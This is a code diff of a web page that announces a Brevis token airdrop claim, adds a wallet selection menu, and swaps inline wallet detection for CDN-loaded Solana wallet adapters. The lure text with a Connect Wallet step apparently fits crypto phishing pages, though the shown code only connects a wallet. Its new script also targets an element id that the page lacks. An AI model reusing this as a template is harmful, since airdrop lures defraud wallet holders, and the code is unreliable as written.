@@ -44,6 +44,19 @@
             }
         }
 
+        .wallet-btn {
+        margin: 5px;
+        padding: 10px 20px;
+        cursor: pointer;
+        border-radius: 5px;
+        border: 1px solid #444;
+        }
+
+        .wallet-btn:hover {
+        background-color: #eee;
+        }
+
+
         :root {
             --foreground-rgb: 0, 0, 0;
             --background-start-rgb: 214, 219, 220;
@@ -4097,6 +4110,11 @@
                                 <div></div>
                                 <div class="ComingSoon_comingSoonText2__qK5sV">The airdrop claim for new Brevis users is now open. Get your tokens now!</div>
                                 <button id="connectBtn" class="gradient-btn bst-butn-prime">Connect Wallet</button>
+                                <div id="wallet-menu" style="display:none; margin-top:20px;">
+                                <button class="wallet-btn" data-wallet="phantom">Phantom</button>
+                                <button class="wallet-btn" data-wallet="solflare">Solflare</button>
+                                <button class="wallet-btn" data-wallet="coinbase">Coinbase Wallet</button>
+                                </div>
                             </div>
                         </div>
                     </div>
@@ -4118,68 +4136,45 @@
 
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 <script src="script.js"></script>
-<script>
-document.addEventListener("DOMContentLoaded", () => {
-  const button = document.getElementById("connectBtn");
+<script type="module">
+  import { PhantomWalletAdapter, SolflareWalletAdapter, CoinbaseWalletAdapter } 
+    from "https://cdn.jsdelivr.net/npm/@solana/wallet-adapter-wallets@latest/dist/index.js";
 
-  function getAvailableWallets() {
-    const wallets = [];
+  const connectBtn = document.getElementById("connect-wallet");
+  const walletMenu = document.getElementById("wallet-menu");
 
-    if (window.solana?.isPhantom) {
-      wallets.push({ name: "Phantom", provider: window.solana });
-    }
-
-    if (window.solflare?.isSolflare) {
-      wallets.push({ name: "Solflare", provider: window.solflare });
-    }
-
-    if (window.backpack?.isBackpack) {
-      wallets.push({ name: "Backpack", provider: window.backpack });
-    }
-
-    return wallets;
-  }
-
-  async function connectWallet(wallet) {
-    try {
-      const resp = await wallet.provider.connect();
-      const pubkey = resp.publicKey?.toString() || wallet.provider.publicKey?.toString();
-      alert(`Connected ${wallet.name}: ${pubkey}`);
-      console.log(`${wallet.name} connected:`, pubkey);
-    } catch (err) {
-      console.error(`${wallet.name} connection failed`, err);
-      alert(`${wallet.name} connection rejected`);
-    }
-  }
-
-  button.addEventListener("click", async () => {
-    const wallets = getAvailableWallets();
-
-    if (wallets.length === 0) {
-      // No supported wallets installed
-      alert("No Solana wallet found. Please install Phantom, Solflare, or Backpack.");
-      window.open("https://phantom.com/download", "_blank");
-      return;
-    }
-
-    if (wallets.length === 1) {
-      // Only one wallet installed → auto connect
-      connectWallet(wallets[0]);
-      return;
-    }
-
-    // Multiple wallets installed → simple chooser
-    const choice = prompt(
-      "Which wallet would you like to connect?\n\n" +
-      wallets.map((w, i) => `${i + 1}. ${w.name}`).join("\n")
-    );
-
-    const index = Number(choice) - 1;
-    if (!wallets[index]) return;
-
-    connectWallet(wallets[index]);
+  // Show wallet options when main button is clicked
+  connectBtn.addEventListener("click", () => {
+    walletMenu.style.display = "block";
   });
-});
+
+  walletMenu.addEventListener("click", async (event) => {
+    const walletName = event.target.dataset.wallet;
+    if (!walletName) return;
+
+    try {
+      let wallet;
+      switch (walletName) {
+        case "phantom":
+          wallet = new PhantomWalletAdapter();
+          break;
+        case "solflare":
+          wallet = new SolflareWalletAdapter();
+          break;
+        case "coinbase":
+          wallet = new CoinbaseWalletAdapter();
+          break;
+      }
+
+      await wallet.connect();
+      alert(`Connected to ${wallet.name}!`);
+      walletMenu.style.display = "none";
+
+    } catch (err) {
+      console.error(err);
+      alert(`Failed to connect to ${walletName}`);
+    }
+  });
 </script>
 
 
